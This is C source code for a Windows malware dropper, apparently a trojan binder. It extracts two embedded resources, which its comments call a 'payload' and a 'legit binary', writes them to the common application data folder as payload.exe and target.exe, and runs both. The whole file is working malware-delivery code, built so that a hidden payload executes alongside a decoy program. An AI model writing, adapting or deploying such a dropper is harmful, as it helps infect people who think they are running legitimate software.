#include <stdio.h>
#include <stdlib.h>
#include "includes/windows.h"
#include "includes/resource.h"
#include "includes/shlobj.h"
#include "includes/shlwapi.h"

/*
IMPORTANT : PAS OUBLIER DE LINKER shlwapi.lib (-lshlwapi)
*/
int dropBinary(const char *resourceID, int nameID)
{
    HRSRC hrsrc = NULL;
    HGLOBAL hGlobal = NULL;
    BYTE *pExeResource = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD size =0;
    int ret = 0;
    char binaryPath[MAX_PATH];

    PROCESS_INFORMATION pi;
    STARTUPINFO si;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(&pi));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    HMODULE hModule = GetModuleHandle(NULL);
    hrsrc = FindResource(NULL,resourceID, RT_RCDATA);

    //get the path to %appdata%
    if(SUCCEEDED(SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, 0, binaryPath)))
    {
        if(nameID==0)
            PathAppend(binaryPath, "payload.exe");
        else
            PathAppend(binaryPath, "target.exe");
        printf("Path : %s\n", binaryPath);
    }

    if(hrsrc==NULL) {
        perror("FindResource failed : ");
        printf("\n");
        return -1;
    }

    //loading of the binary
    hGlobal = LoadResource(hModule, hrsrc);
    if(hGlobal == NULL) {
        printf("LoadResource failed\n");
        return -1;
    }

    size = SizeofResource(hModule,hrsrc);
    pExeResource = (BYTE*)LockResource(hGlobal);

    if(pExeResource==NULL)  {
        printf("LockResource failed\n");
        return -1;
    }

    //create a temporary file
    hFile = CreateFile(binaryPath, GENERIC_WRITE|GENERIC_READ,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    //dropping the executable on disk
    if(hFile!=INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        WriteFile(hFile, pExeResource, size, &bytesWritten, NULL);
        CloseHandle(hFile);
    }

    //start the binary
    ret = CreateProcess(0, binaryPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    printf("CreateProcess returned %d\n",ret);
    return 0;
}

int main(int argc, char **argv)
{
    //dropping the payload
    if(dropBinary("#101",0)==-1)
    {
        printf("Delivery of the payload failed\n");
        return -1;
    }

    //dropping the legit binary
    if(dropBinary("#102",1)==-1)
    {
        printf("Delivery of the legit binary failed\n");
        return -1;
    }

    //nothing went wrong
    printf("Operation successful\n");
    return 0;
}
